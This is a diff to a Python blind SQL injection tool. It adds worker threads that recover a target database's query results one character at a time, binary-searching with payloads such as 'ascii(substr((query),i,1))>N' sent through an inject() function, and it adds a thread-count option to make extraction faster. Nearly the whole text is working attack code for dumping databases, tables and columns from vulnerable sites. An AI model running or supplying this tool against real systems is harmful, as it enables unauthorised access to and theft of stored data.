@@ -19,6 +19,8 @@ from time import sleep
 from argparse import ArgumentParser
 from tqdm import tqdm
 import requests
+import threading
+from queue import Queue
 
 
 # parsed command line args
@@ -148,6 +150,60 @@ def determine_records(subquery, **kwargs):
 
 
 '''
+Worker thread to determine a single char
+in a string
+'''
+def char_worker(res_list, work_queue, pbar):
+    while True:
+        item = work_queue.get()
+        if item is None:
+            break
+        index, query = item
+
+        left = 0
+        right = len(char_range) - 1
+        while left < right:
+            mid = int((left + right) / 2)
+            if inject("ascii(substr(({}),{},1))>{}"
+                      .format(query, index + 1, char_range[mid])):
+                left = mid + 1
+            else:
+                right = mid
+
+        if left >= len(char_range) or \
+                not inject("ascii(substr(({}),{},1))={}"
+                           .format(query, index+1, char_range[left])):
+            raise Exception("Cannot determine offset {} char for query {}\n"
+                            "{}/{} Current result: {}"
+                            .format(index, query, index, length,
+                                    ''.join(['*' if c == -1 else chr(c)
+                                             for c in res_list])))
+
+        res_list[index] = char_range[left]
+
+        if pbar and not args.silent:
+            # find index of first undetermined char
+            first_index = 0
+            try:
+                first_index = res_list.index(-1)
+            except Exception as e:
+                first_index = len(res_list) - 1
+            # fix first_index to be FIX_PT
+            LEN = 50
+            FIX_PT = LEN - 10
+            start = max(first_index-FIX_PT, 0) \
+                                if first_index-FIX_PT + LEN < len(res_list) \
+                                else max(0, len(res_list) - LEN)
+            end = start + LEN
+            pbar.set_description(''.join(
+                ['*' if c == -1 else chr(c)
+                 for c in res_list])
+                [start:end])
+            pbar.update()
+
+        work_queue.task_done()
+
+'''
 Determine a subquery that return a single record with a single column
 '''
 def determine_string(subquery, pbar_enabled=True):
@@ -161,39 +217,33 @@ def determine_string(subquery, pbar_enabled=True):
 
     res = [-1]
     res *= length
-    pbar = range(length)
+
+    work_queue = Queue()
+
     if pbar_enabled and not args.silent:
-        pbar = tqdm(pbar)
-    for i in pbar:
-        # binary search for matching char in char_range
-        left = 0
-        right = len(char_range) - 1
-        while left < right:
-            mid = int((left + right) / 2)
-            if inject("ascii(substr(({}),{},1))>{}"
-                      .format(subquery, i+1, char_range[mid])):
-                left = mid + 1
-            else:
-                right = mid
+        pbar = tqdm(range(length), dynamic_ncols=True)
 
-        if left >= len(char_range) or \
-                not inject("ascii(substr(({}),{},1))={}"
-                           .format(subquery, i+1, char_range[left])):
-            raise Exception("Cannot determine offset {} char for query {}\n"
-                            "{}/{} Current result: {}"
-                            .format(i, subquery, i, length,
-                                    ''.join(['*' if c == -1 else chr(c)
-                                             for c in res])))
-
-        res[i] = char_range[left]
-
-        if pbar_enabled and not args.silent:
-            pbar.set_description(''.join(
-                ['*' if c == -1 else chr(c)
-                 for c in res])
-                [i-50 if i >= 50 else 0 : 50 if i < 50 else i+1])
-
+    for i in range(length):
+        work_queue.put((i, subquery))
         i += 1
+
+    worker_threads = []
+    for i in range(args.thread_count):
+        t = threading.Thread(
+                target=char_worker,
+                args=(res, work_queue, pbar if pbar_enabled else False))
+        t.start()
+        worker_threads.append(t)
+
+    # block until all tasks are done
+    work_queue.join()
+
+    # stop workers
+    for i in range(args.thread_count):
+        work_queue.put(None)
+    for t in worker_threads:
+        t.join()
+
     res = ''.join(map(chr, res))
     print_debug("Determined result for query '{}': {}".format(subquery, res))
     return res
@@ -265,6 +315,8 @@ def inject_func(payload, args):
                              'databases | tables | columns | table')
     parser.add_argument('--retries', required=False, type=int, default=5,
                         help='Max of retries for single injection')
+    parser.add_argument('-c', '--thread-count', required=False, type=int,
+                        dest='thread_count', default=5, help='Threads to use')
     parser.add_argument('-s', '--silent', action='store_true',
                         dest='silent', help='Silent mode, only print result')
     parser.add_argument('-a', '--use-all-printable-char', action='store_true',
